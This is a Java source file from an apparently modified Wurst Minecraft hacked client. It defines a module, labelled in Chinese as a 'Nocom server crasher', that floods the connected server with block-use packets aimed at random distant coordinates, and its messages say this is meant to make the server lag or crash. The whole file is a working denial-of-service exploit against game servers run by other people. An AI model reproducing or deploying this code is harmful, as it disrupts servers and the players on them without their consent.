/*
 * Copyright (c) 2014-2022 Wurst-Imperium and contributors.
 * Modified By KrisTHL181 in 2025
 * 
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt 
 */
package net.wurstclient.forge.hacks;

import java.util.Random;

import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.EnumHand;
import net.wurstclient.forge.Category;
import net.wurstclient.forge.Hack;
import net.wurstclient.forge.settings.SliderSetting;
import net.wurstclient.forge.settings.SliderSetting.ValueDisplay;
import net.wurstclient.forge.utils.ChatUtils;


public final class NocomCrashHack extends Hack {
    private final Random rand = new Random();

    private final SliderSetting packets = new SliderSetting("数据包个数", 500, 1, 1000, 1, ValueDisplay.INTEGER);
	private final SliderSetting delay = new SliderSetting("数据包发送延迟", "每次发送数据包之间的等待时间(毫秒)", 10, 0, 100, 1, ValueDisplay.INTEGER);

    public NocomCrashHack() {
        super("Nocom崩服器", "利用Nocom漏洞使服务器崩溃.");
        setCategory(Category.OTHER);
        addSetting(packets);
    }

    @Override
    public void onEnable() {
        ChatUtils.message("正在发送数据包, 这大概将花费 " + packets.getValueI() * 10 + "ms.");

        Thread t = new Thread(() -> {
            try {
                for (int i = 0; i < packets.getValueI(); i++) {
                    if (i % 100 == 0 || i == packets.getValueI())
                        ChatUtils.message(String.format("%d/%d", i, packets.getValueI()));

                    NetHandlerPlayClient networkHandler = Minecraft.getMinecraft().getConnection();
                    if (networkHandler == null)
                        break;

                    Thread.sleep(delay.getValueI());

					Vec3d cpos = pickRandomPos();
					BlockPos pos = new BlockPos(cpos.x, cpos.y, cpos.z);
					EnumFacing facing = EnumFacing.DOWN;
					
					CPacketPlayerTryUseItemOnBlock packet = new CPacketPlayerTryUseItemOnBlock(
						pos, facing, EnumHand.MAIN_HAND, 0.5F, 0.5F, 0.5F);
					networkHandler.sendPacket(packet);
                }

                ChatUtils.message("发送完成. 服务器应该开始卡顿了.");
            } catch (Exception e) {
                e.printStackTrace();
                ChatUtils.error("崩服失败, 因为: " + e.getClass().getSimpleName() + ".");
            }

            setEnabled(false);
        });

        t.start();
    }

    private Vec3d pickRandomPos() {
        int x = rand.nextInt(16777215);
        int y = 255;
        int z = rand.nextInt(16777215);
        return new Vec3d(x, y, z);
    }
}